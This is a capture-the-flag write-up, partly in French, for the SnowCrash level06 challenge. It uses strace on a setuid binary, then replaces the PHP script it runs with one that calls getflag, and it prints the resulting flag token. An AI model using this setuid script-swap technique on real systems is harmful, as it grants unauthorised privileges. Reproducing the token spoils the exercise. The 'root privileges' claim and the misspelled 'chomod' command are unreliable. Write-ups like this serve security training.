# Level06

</br></br>

## ls -l

```sh
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Les deux fichiers sont exécutables et lisibles
Dans le fichier level06, rws signifie lecture-écriture-exécution + setuid. Cela signifie que lorsque le fichier est exécuté, l'utilisateur exécutant a les privilèges du propriétaire du fichier (flag06). Ainsi, lorsque l'utilisateur level06 exécute le fichier level06, il aura les privilèges de l'utilisateur flag06 lors de son exécution.

</br></br>

## level06

```bash
level06@SnowCrash:~$ strace ./level06
...
...
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
brk(0)                                  = 0x804b000
brk(0x806c000)                          = 0x806c000
getegid32()                             = 2006
geteuid32()                             = 2006
setresgid32(2006, 2006, 2006)           = 0
setresuid32(2006, 2006, 2006)           = 0
execve("/usr/bin/php", ["/usr/bin/php", "/home/user/level06/level06.php", "", ""], [/* 21 vars */]) = 0
...
...
```

level06 execute le fichier level06.php avec les privilèges root

```
level06@SnowCrash:~$ chomod 777 .
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$ rm -rf level06.php
level06@SnowCrash:~$ ls
level06
level06@SnowCrash:~$ vim level06.php
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php

<?php
echo exec('getflag');
?>
level06@SnowCrash:~$ ./level06

Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
level06@SnowCrash:~$ su level07
Password:
```
